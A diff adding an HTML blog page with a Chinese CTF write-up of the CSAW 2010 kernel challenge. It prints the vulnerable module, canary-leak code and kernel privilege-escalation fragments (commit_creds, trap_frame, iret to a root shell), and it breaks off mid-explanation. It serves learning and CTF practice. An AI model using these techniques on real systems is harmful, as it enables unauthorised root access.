@@ -1,0 +1,1057 @@
+
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+
+  <title>KERNEL-CSAW-2010-kernel | t1an5t&#39;s Treasure</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="分析2010年CSAW的一道kernel题目，似乎没有什么正经姓名，就叫它kernel好了。 我的环境是之前配置的32位环境。busybox-1.30.0 + linux2.6.32.1 + qemu">
+<meta name="keywords" content="pwnable,kernel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="KERNEL-CSAW-2010-kernel">
+<meta property="og:url" content="http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/index.html">
+<meta property="og:site_name" content="t1an5t&#39;s Treasure">
+<meta property="og:description" content="分析2010年CSAW的一道kernel题目，似乎没有什么正经姓名，就叫它kernel好了。 我的环境是之前配置的32位环境。busybox-1.30.0 + linux2.6.32.1 + qemu">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/1561019776820.png">
+<meta property="og:image" content="http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/1561020475781.png">
+<meta property="og:image" content="http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/1561020616746.png">
+<meta property="og:image" content="http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/1561021109344.png">
+<meta property="og:image" content="http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/1561021200638.png">
+<meta property="og:image" content="http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/1561028920879.png">
+<meta property="og:image" content="http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/1561029351300.png">
+<meta property="og:updated_time" content="2019-06-20T11:58:49.333Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="KERNEL-CSAW-2010-kernel">
+<meta name="twitter:description" content="分析2010年CSAW的一道kernel题目，似乎没有什么正经姓名，就叫它kernel好了。 我的环境是之前配置的32位环境。busybox-1.30.0 + linux2.6.32.1 + qemu">
+<meta name="twitter:image" content="http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/1561019776820.png">
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+  
+    <link rel="alternative" href="/atom.xml" title="t1an5t&#39;s Treasure" type="application/atom+xml">
+  
+
+
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+
+  <link rel="stylesheet" href="/css/style.css">
+  <!-- <link href="/css/show.ua.css" rel="stylesheet" type="text/css" > -->
+  <link href="http://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script><![endif]-->
+  <!-- <link href="/vendors/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" /> -->
+
+  <link href="/vendors/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+  <script src="/js/ua-parser.min.js" type="text/javascript"></script>
+  <script src="/js/jquery.js" type="text/javascript"></script>
+  <script src="/js/jquery.min.js" type="text/javascript"></script>
+  <script src="/js/scrollReveal.js" type="text/javascript"></script>
+  <script src="http://cdn.bootcss.com/instantsearch.js/1.5.1/instantsearch.js"></script>
+  <script src="/js/algolia-search.js" type="text/javascript"></script>
+  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script> -->
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+  
+  
+
+
+
+
+
+
+  
+  
+  <!-- 
+  
+  
+  
+  
+   -->
+
+  <script>
+   var CONFIG = {
+    root: '/',
+    algolia: {
+          applicationID: "",
+          apiKey: "",
+          adminApiKey: "",
+          indexName: "",
+          hits: {"per_page":10},
+          labels: {"input_placeholder":"搜索...","hits_empty":"未发现与 「${query}」相关的内容","hits_stats":"${hits} 条相关条目，使用了 ${time} 毫秒"}
+        }
+  };
+  </script>
+
+</head>
+
+
+</html>
+<body>
+<div id="container">
+  <div id="wrap">
+    <header id="header">
+  <div id="banner"></div>
+  <div data-scroll-reveal="enter top"  id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">t1an5t&#39;s Treasure</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Like to sing, dance, rap and pwn.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
+        
+          <a class="main-nav-link" href="/archives"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
+        
+          <a class="main-nav-link" href="/about_me.html"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a  class="nav-icon" href="/atom.xml" title="RSS Feed"><i class="fa fa-rss" aria-hidden="true"></i></a>
+        
+        <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"><i class="fa fa-search" aria-hidden="true"></i></a>
+      </nav>
+        <div id="local-search-input"></div>
+      <!-- 百度搜索 -->
+     <!-- <div id="search-form-wrap">
+        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
+          <input type="submit" value="" class="search-form-submit">
+          <input name=tn type=hidden value="bds">
+          <input name=cl type=hidden value="3">
+          <input name=ct type=hidden value="2097152">
+          <input type="hidden" name="si" value="tianstcht.github.io">
+        </form>
+      </div>
+      -->
+   
+    </div>
+  </div>
+</header>
+
+    <div class="outer">
+      <section id="main"><article   id="post-KERNEL-CSAW-2010-kernel" class="article article-type-post" itemscope itemprop="blogPost">
+  <div data-scroll-reveal="enter top and over 0.7s"  class="article-meta">
+    <a  href="/KERNEL-CSAW-2010-kernel/" class="article-date">
+  <i class="fa fa-calendar"></i>
+  <time  datetime="2019-06-20T11:42:11.000Z" itemprop="datePublished">2019-06-20</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/kernel/">kernel</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner"  >
+    
+    
+
+      <header class="article-header">
+
+        
+  
+    <h1 class="article-title" itemprop="name">
+      <i class="fa fa-pencil-square-o  article-title-icon"></i>KERNEL-CSAW-2010-kernel
+    </h1>
+  
+
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+        </br>
+        <span id="busuanzi_container_page_pv">
+          阅读次数<span id="busuanzi_value_page_pv"></span>
+        </span>
+        <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>2010年<code>CSAW</code>的一道<code>kernel</code>题目，似乎没有什么正经姓名，就叫它<code>kernel</code>好了。</p>
+<p>我的环境是之前配置的<code>32</code>位环境。<code>busybox-1.30.0</code> + <code>linux2.6.32.1</code> + <code>qemu</code></p>
+<a id="more"></a>
+
+<p>题目直接给了源代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * csaw.c</span></span><br><span class="line"><span class="comment"> * CSAW CTF Challenge Kernel Module</span></span><br><span class="line"><span class="comment"> * Jon Oberheide &lt;jon@oberheide.org&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This module implements the /proc/csaw interface which can be read</span></span><br><span class="line"><span class="comment"> * and written like a normal file. For example:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * $ cat /proc/csaw</span></span><br><span class="line"><span class="comment"> * Welcome to the CSAW CTF challenge. Best of luck!</span></span><br><span class="line"><span class="comment"> * $ echo "Hello World" &gt; /proc/csaw</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LENGTH 64</span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Jon Oberheide"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"CSAW CTF Challenge Kernel Module"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">csaw_proc</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_write(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *ubuf, <span class="keyword">unsigned</span> <span class="keyword">long</span> count, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: called csaw_write\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We should be safe to perform this copy from userspace since our</span></span><br><span class="line"><span class="comment">     * kernel is compiled with CC_STACKPROTECTOR, which includes a canary</span></span><br><span class="line"><span class="comment">     * on the kernel stack to protect against smashing the stack.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * While the user could easily DoS the kernel, I don't think they</span></span><br><span class="line"><span class="comment">     * should be able to escalate privileges without discovering the</span></span><br><span class="line"><span class="comment">     * secret stack canary value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;buf, ubuf, count)) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">"csaw: error copying data from userspace\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_read(<span class="keyword">char</span> *page, <span class="keyword">char</span> **start, <span class="keyword">off_t</span> off, <span class="keyword">int</span> count, <span class="keyword">int</span> *eof, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: called csaw_read\n"</span>);</span><br><span class="line"></span><br><span class="line">    *eof = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">"Welcome to the CSAW CTF challenge. Best of luck!\n"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page, buf + off, MAX_LENGTH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> MAX_LENGTH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __init</span><br><span class="line">csaw_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: loading module\n"</span>);</span><br><span class="line"></span><br><span class="line">    csaw_proc = create_proc_entry(<span class="string">"csaw"</span>, <span class="number">0666</span>, <span class="literal">NULL</span>);</span><br><span class="line">    csaw_proc-&gt;read_proc = csaw_read;</span><br><span class="line">    csaw_proc-&gt;write_proc = csaw_write;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: created /proc/csaw entry\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit</span><br><span class="line">csaw_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (csaw_proc) &#123;</span><br><span class="line">        remove_proc_entry(<span class="string">"csaw"</span>, csaw_proc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: unloading module\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(csaw_init);</span><br><span class="line">module_exit(csaw_exit);</span><br></pre></td></tr></table></figure>
+
+<p>经过了几天的学习，差不多也知道这种驱动<code>ko</code>文件代码差不多都是干什么的了。</p>
+<p>如果我理解没问题的话，那么<code>ko</code>文件的意思可以理解为，在我们<code>insmod</code>了这个<code>ko</code>之后，对<code>/proc/csaw</code>这个文件的操作就会调用<code>ko</code>中可对应的函数，比如<code>read</code>就是执行了<code>csaw_read</code>，用户态到驱动是如何传入参数的这里暂时还没参透。</p>
+<p>&nbsp;</p>
+<p>很明显问题出在<code>csaw_write</code>，没有检测用户输入的长度，就直接用<code>copy_from_user</code>往内核空间里传数据，所以是溢出了。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_write(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *ubuf, <span class="keyword">unsigned</span> <span class="keyword">long</span> count, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: called csaw_write\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We should be safe to perform this copy from userspace since our</span></span><br><span class="line"><span class="comment">     * kernel is compiled with CC_STACKPROTECTOR, which includes a canary</span></span><br><span class="line"><span class="comment">     * on the kernel stack to protect against smashing the stack.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * While the user could easily DoS the kernel, I don't think they</span></span><br><span class="line"><span class="comment">     * should be able to escalate privileges without discovering the</span></span><br><span class="line"><span class="comment">     * secret stack canary value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;buf, ubuf, count)) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">"csaw: error copying data from userspace\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;</p>
+<p>作者这里提到了，<code>kernel</code>里开启了<code>canary</code>，跟用户控件一样，不能被破坏的，所以要么爆破，要么泄露。</p>
+<p>观察<code>csaw_read</code>函数:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_read(<span class="keyword">char</span> *page, <span class="keyword">char</span> **start, <span class="keyword">off_t</span> off, <span class="keyword">int</span> count, <span class="keyword">int</span> *eof, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: called csaw_read\n"</span>);</span><br><span class="line"></span><br><span class="line">    *eof = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">"Welcome to the CSAW CTF challenge. Best of luck!\n"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page, buf + off, MAX_LENGTH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> MAX_LENGTH;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>memcpy</code>的时候，传了很长的数据给用户空间，如果控制一下<code>off</code>这个参数，那用这个就可以泄露<code>canary</code>。</p>
+<p>作者说控制这个参数用<code>lseek</code>就行了。</p>
+<p>搜索了一下发现：<code>lseek</code>如果传入文件描述符<code>fd</code>以及<code>SEEK_CUR</code>其实也就可以控制<code>off</code>了。：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">lseek(fd, off, SEEK_CUR)</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;</p>
+<p>然后知道了<code>canary</code>就可以执行栈溢出来覆盖<code>ip</code>指针进行提权了。</p>
+<p>说着倒是挺简单，但是我以前没写过这种东西啊。</p>
+<p>&nbsp;</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>首先是要把内核驱动编译，然后<code>qemu</code>跑起来。</p>
+<p>编译的话采用<code>muhe</code>师傅的<code>Makefile</code>：</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := csaw.o  </span><br><span class="line">KERNELDR := ~/linux-2.6.32.1/</span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span>  </span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">		<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules  </span><br><span class="line"><span class="section">moduels_install:  </span></span><br><span class="line">		<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install  </span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">		rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure>
+
+<p>里面的空格报错要换成<code>tab</code>。</p>
+<p>&nbsp;</p>
+<p>得到<code>csaw.ko</code>文件后丢到<code>busybox</code>的<code>_install</code>目录下的<code>usr</code>里，放到那里不重要，还能找到就行。</p>
+<p>然后在<code>_install</code>目录下重新打包文件系统，每次往<code>_install</code>目录里放完东西都要加这一步：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;</p>
+<p>编译<code>POC</code>和<code>exp</code>采用的命令为：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -static exp.c -o exp</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;</p>
+<p>先写泄露<code>canary</code>的<code>dump.c</code>：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    fd = open(<span class="string">"/proc/csaw"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"open file error.\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lseek(fd, <span class="number">16</span>, SEEK_CUR);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd, buf, <span class="number">64</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hexdump data.</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>, buf[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" | "</span>);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, buf[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后编译后也放到<code>_install/usr</code>目录下，然后去重新打包。</p>
+<p>然后去起<code>qemu</code>，我的<code>qemu</code>启动命令就是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd ../busybox-1.30.0/rootfs.img -append <span class="string">"root=/dev/ram rdinit=/sbin/init"</span> -gdb tcp::1234</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;</p>
+<p>然后运行<code>dump</code>发现果然泄露：</p>
+<p><img src="/KERNEL-CSAW-2010-kernel/1561019776820.png" alt="1561019776820"></p>
+<p>那个<code>e1 01 3a 86</code> 就是<code>canary</code>，下面我会证明这件事。</p>
+<p>&nbsp;</p>
+<p>参考<a href="https://www.anquanke.com/post/id/85840" target="_blank" rel="noopener">muhe师傅的第二篇入门文章</a>来做调试的相关工作:</p>
+<p>在<code>qemu</code>里找<code>.text</code>的地址：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep 0 /sys/module/csaw/sections/.text</span><br></pre></td></tr></table></figure>
+
+<p><img src="/KERNEL-CSAW-2010-kernel/1561020475781.png" alt="1561020475781"></p>
+<p>&nbsp;</p>
+<p>然后启动<code>gdb vmlinux</code>，<code>target remote :1234</code>进入远程调试。</p>
+<p>然后从<code>gdb</code>进入到<code>_install/usr</code>目录下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add-symbol-file ./csaw.ko 0xc8832000</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以下符号断点了或者直接下源码的行数断点：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b csaw_read</span><br><span class="line">or</span><br><span class="line">b 65</span><br></pre></td></tr></table></figure>
+
+<p>再次运行<code>dump</code>，程序已经被断住了：</p>
+<p><img src="/KERNEL-CSAW-2010-kernel/1561020616746.png" alt="1561020616746"></p>
+<p>&nbsp;</p>
+<p>通过下断点可以得知<code>canary</code>传到了<code>edi</code>：</p>
+<p><img src="/KERNEL-CSAW-2010-kernel/1561021109344.png" alt="1561021109344"></p>
+<p>可以证明我们找的<code>canary</code>的位置是对的：</p>
+<p><img src="/KERNEL-CSAW-2010-kernel/1561021200638.png" alt="1561021200638"></p>
+<p>现在有了<code>canary</code>就可以考虑开始覆盖<code>ret</code>的地址来提权，初次接触，所以提权代码怎么写又是个大问题。我只能试图去理解一下<code>muhe</code>师傅的思路。</p>
+<p>首先肯定是通过覆盖<code>ret</code>将程序流劫持到我们的<code>exp</code>上来，然后调用了提权代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067fc0</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067e20</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">        <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之前没见过，所以去查了一下这种写法：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__attribute__((regparm(n)))</span><br></pre></td></tr></table></figure>
+
+<p>其实就是<code>i386</code>下可以保证寄存器传参，<code>n</code>最大为3。</p>
+<p>&nbsp;</p>
+<p>两个函数的地址是怎么找到的呢？</p>
+<p>通过在启动的<code>qemu</code>里输入y以下命令查到：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep commit_creds /proc/kallsyms</span><br><span class="line">grep prepare_kernel_cred /proc/kallsyms</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;</p>
+<p>接下来这段汇编又是什么情况呢。将一个<code>struct trap_frame</code>的元素的起始位置作为栈顶，然后<code>iret</code>：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs;popl tf+4;"</span> <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">"pushfl;popl tf+8;"</span>  <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">"pushl %esp;popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss;popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>去搜索<code>iret</code>，然后从<a href="https://bestwing.me/write-kernel-exploits-2.html" target="_blank" rel="noopener">swing师傅的内核文章</a>里找到了很好的解答</p>
+<p>首先是更详细的<code>trap_frame</code>的解释：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">void</span>* eip;				<span class="comment">// instruction pointer +0</span></span><br><span class="line">	<span class="keyword">uint32_t</span> cs;			<span class="comment">// code segment    +4</span></span><br><span class="line">	<span class="keyword">uint32_t</span> eflags;		<span class="comment">// CPU flags       +8</span></span><br><span class="line">	<span class="keyword">void</span>* esp;				<span class="comment">// stack pointer       +12</span></span><br><span class="line">	<span class="keyword">uint32_t</span> ss;			<span class="comment">// stack segment   +16</span></span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_tf</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">		<span class="keyword">asm</span>(<span class="string">"pushl %cs; popl tf+4;"</span>	<span class="comment">//填充tf.cs为当前的cs</span></span><br><span class="line">		<span class="string">"pushfl; popl tf+8;"</span>		<span class="comment">//填充tf.eflags为当前的eflags</span></span><br><span class="line">		<span class="string">"pushl %esp; popl tf+12;"</span>	<span class="comment">//填充tf.esp为当前的esp</span></span><br><span class="line">		<span class="string">"pushl %ss; popl tf+16;"</span>);	<span class="comment">//填充tf.ss为当前的ss</span></span><br><span class="line">		tf.eip = &amp;launch_shell;		<span class="comment">//填充tf.eip为launch_shell</span></span><br><span class="line">		tf.esp -= <span class="number">1024</span>;		<span class="comment">//unused part of stack</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>trap_frame</code>是硬件在栈上保存的结构，用<code>iret</code>可以通过这个结构体所记录的东西从<strong>内核态</strong>恢复到<strong>用户态</strong>去执行<code>eip</code>。</p>
+<p>所以现在就知道整段<code>exp</code>到底在干什么了：</p>
+<blockquote>
+<ol>
+<li><p>首先通过泄露的<code>canary</code>以及寻找的偏移覆盖掉内核中<code>csaw_write</code>栈中的<code>eip</code>。</p>
